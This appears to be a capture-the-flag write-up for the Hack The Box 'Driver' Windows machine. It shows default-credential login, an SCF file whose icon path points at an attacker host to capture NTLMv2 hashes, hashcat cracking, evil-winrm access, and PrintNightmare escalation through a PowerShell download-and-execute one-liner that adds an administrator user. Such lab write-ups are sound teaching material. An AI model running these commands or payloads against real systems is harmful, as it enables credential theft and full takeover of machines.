## Default Information
IP Address: 10.10.11.106\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.106    driver.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.11.106 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-05 16:09:26 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 5985/tcp on 10.10.11.106                                  
Discovered open port 80/tcp on 10.10.11.106                                    
Discovered open port 445/tcp on 10.10.11.106                                   
Discovered open port 135/tcp on 10.10.11.106  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| http | Microsoft IIS httpd 10.0 | Open |
| 135	| msrpc | Microsoft Windows RPC | Open |
| 445	| microsoft-ds | Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) | Open |
| 135	| http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Open |

From the nmap output, we can also see that the OS of the server is likely to be Microsoft Windows Server 2008.

```
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), FreeBSD 6.2-RELEASE (85%)
```
### RPC Enumeration on port 135

Using impacket's RPC dump, we notice that this machine is vulnerable to PrinterNightmare which is CVE-2021-34527

```
┌──(kali㉿kali)-[~]
└─$ impacket-rpcdump -port 135 10.10.11.106 | grep MS-RPRN
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

### SMB Enumeration
Next, let us try to do null authentication on the smb client using smbmap. Unfortunately, we are unable to do null authentication for the smb client.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p "" -H 10.10.11.106 -P 445 2>&1                     
[!] Authentication error on 10.10.11.106
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p "" -H 10.10.11.106 -P 445 2>&1
[!] Authentication error on 10.10.11.106
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p null -H 10.10.11.106 -P 445 2>&1
[!] Authentication error on 10.10.11.106
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ smbmap -u "" -p null -H 10.10.11.106 -P 445 2>&1
[!] Authentication error on 10.10.11.106
```

### Web Enumeration on port 80
Using gobuster, we are able to find some of the endpoints on http://driver.htb:80

```
http://10.10.11.106:80/index.php            (Status: 401) [Size: 20]
http://10.10.11.106:80/images               (Status: 301) [Size: 153] [--> http://10.10.11.106:80/images/]
http://10.10.11.106:80/Images               (Status: 301) [Size: 153] [--> http://10.10.11.106:80/Images/]
http://10.10.11.106:80/Index.php            (Status: 401) [Size: 20]
http://10.10.11.106:80/IMAGES               (Status: 301) [Size: 153] [--> http://10.10.11.106:80/IMAGES/]
http://10.10.11.106:80/INDEX.php            (Status: 401) [Size: 20]
```

Visiting http://driver.htb, we realize that we are unable to visit the site as it requires us to be authenticated. However, we are able to know that the site that we are visiting is MFP Firmware Update Center. Apart from that, we are also able to know that the user that we are going to authenticate to this site is an admin user.

![Access denied](https://github.com/joelczk/writeups/blob/main/HTB/Images/Driver/access_denied.png)

Looking at the documentation [here](http://download.level1.com/level1/manual/MFP_UM.pdf), we can see that the default username and password is ```admin```
![Documentation for web server](https://github.com/joelczk/writeups/blob/main/HTB/Images/Driver/documentation.png)

Using ```admin:admin```, we are able to login to http://driver.htb
![index.php page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Driver/auth_index.png)

Looking at the ```Firmware Updates``` hyperlink, we are redirected to http://driver.htb/fw_up.php where we are able to upload a file. 

![Uploading file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Driver/file_upload.png)

We realize that the site allows us to upload files of any extension, but we are unable to exploit it furthur as we are unable to find the file path that the file is being saved to. This is a dead end. We will continue to explore other possible file uploads exploits.

## Exploit
### SCF File Upload exploit
Since we know that port 445 is open, this would mean that there is an SMB service that is running for this machine. Looking at the file upload site, we can guess that once we upload a file, the file will be placed on a directory in the SMB server.

Knowing this, we can try to upload an SCF file via the file upload endpoint to obtain the password hash. Using the tutorial from [here](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/), we can craft an exploit file that can allow us to capture the password hash. 

![Uploading exploit.scf file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Driver/exploit_scf.png)

Afterwards, we will start the responder on our local machine to capture the password hash that is being used

```
┌──(kali㉿kali)-[~]
└─$ sudo responder -wrf --lm -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:bb424bbcb4593421:11CD2C340B0572A5A9BC3F0EAD0A2A79:0101000000000000BB566F4FF961D8010926EA0A9C3A602400000000020000000000000000000000                                       
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:dc0cf3c34d14b9f3:6B796EB56F1C6971947848BEF7A25B8D:01010000000000006394D250F961D8010EB88800F3B07E9200000000020000000000000000000000 
```

### Cracking password hash using hashcat
Let us now save the 2 password hashes to a text file and use hashcat to crack the hashes. Using hashid, we know that the 2 hashes belong to NetNTLMv2 hash which corresponds to a hashid of 5600

```
┌──(kali㉿kali)-[~/Desktop/driver]
└─$ hashcat -m 5600 /home/kali/Desktop/driver/hash.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt
hashcat (v6.1.1) starting...
TONY::DRIVER:bb424bbcb4593421:11cd2c340b0572a5a9bc3f0ead0a2a79:0101000000000000bb566f4ff961d8010926ea0a9c3a602400000000020000000000000000000000:liltony
TONY::DRIVER:dc0cf3c34d14b9f3:6b796eb56f1c6971947848bef7a25b8d:01010000000000006394d250f961d8010eb88800f3b07e9200000000020000000000000000000000:liltony
```

We can then use evil-winrm to connect authenticate using the credentials that we have obtained earlier.

```
┌──(kali㉿kali)-[~/Desktop/driver]
└─$ evil-winrm -i 10.10.11.106 -u TONY -p 'liltony'     

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
*Evil-WinRM* PS C:\Users\tony\Documents> 
```

### Obtaining user flag
```
*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
<Redacted user flag>
*Evil-WinRM* PS C:\Users\tony\Desktop> 
```
### Privilge Escalation using Print Nightmare
Using winpeas, we realize that we can access the powershell history file

```
PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.0.10240.17146
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 134B
```

Viewing the contents of the powershell history file, we are able to see that there is a command that adds a printer. From the command, we are able to see the version of the printer that is being added. 

```
*Evil-WinRM* PS C:\Windows\Temp> cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

From winpeas, we are also able to see that there is a spoolsv service that is running in the background

```
Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
TCP        0.0.0.0               49410         0.0.0.0               0               Listening         1180            spoolsv
```

Searching up exploits for spoolsv, we are able to find CVE-2021-1675 which is famously dubbed as PrintNightmare exploit. We can first download the ps1 exploit from [here](https://github.com/calebstewart/CVE-2021-1675)

Afterwards, we will transfer it to the vulnerable server and execute the ps1 script. This script will then create a new user adm1n that belongs to the Administrators group

```
*Evil-WinRM* PS C:\Windows\temp> powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.6:3000/CVE-2021-1675.ps1');Invoke-Nightmare"
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

We will then proceed to verify that the new user has been created and that the new user belongs to the Administrators group.

```
*Evil-WinRM* PS C:\Windows\temp> net user adm1n
User name                    adm1n
Full Name                    adm1n
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/8/2022 2:05:47 AM
Password expires             Never
Password changeable          5/8/2022 2:05:47 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

We can then use evil-winrm to connect to the newly-created adm1n user.

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.106 -u adm1n -p 'P@ssw0rd'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\adm1n\Documents> whoami
driver\adm1n
*Evil-WinRM* PS C:\Users\adm1n\Documents>
```
### Obtaining root flag
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<Redacted root flag>
```

## Post-Exploitation
### SCF File upload
Using the payload that we have specified in the exploit file will cause the server to try to contact our local machine where we have Responder listening to capture the password hash that is being used.

```
[Shell]
Command=2
IconFile=\\10.10.16.6\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

However, saving this as an SCF file alone will only cause the file to be executed when the user browse the file. Adding a ```@``` at the start of the filename will cause the file to be saved to the top of the share drive

### SMB Authentication
Using the credentials that we have captured using responder, we can enumerate the smb shares using smbmap. However, we realize that we can only read IPC$ share but not the rest of the shares.

```
┌──(kali㉿kali)-[~/Desktop/driver]
└─$ smbmap -u TONY -p 'liltony' -H 10.10.11.106 -P 445 2>&1            
[+] IP: 10.10.11.106:445        Name: driver.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

Accessing the IPC$ share, we realize that we are unable to list the directory even after we authenticate using the smbclient

```
┌──(kali㉿kali)-[~/Desktop/driver]
└─$ smbclient -U 'TONY%liltony' //10.10.11.106/IPC$ 2>&1  
smb: \> dir
NT_STATUS_INVALID_INFO_CLASS listing \*
```

### Creating new user using Print Nightmare
By default, the Print Nightmare ps1 exploit that we run will create a new user with ```adm1n:P@ssw0rd``` as the credentials. However, we can also specify our own user and password using the following commands.

```
*Evil-WinRM* PS C:\Windows\temp> powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.6:3000/CVE-2021-1675.ps1');Invoke-Nightmare -NewUser 'test' -NewPassword 'test'"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user test as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

Afterwards, we can verify that a new user ```test``` has been created and the user is part of the Administrators group.

```
*Evil-WinRM* PS C:\Windows\temp> net user test
User name                    test
Full Name                    test
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/8/2022 2:15:49 AM
Password expires             Never
Password changeable          5/8/2022 2:15:49 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```
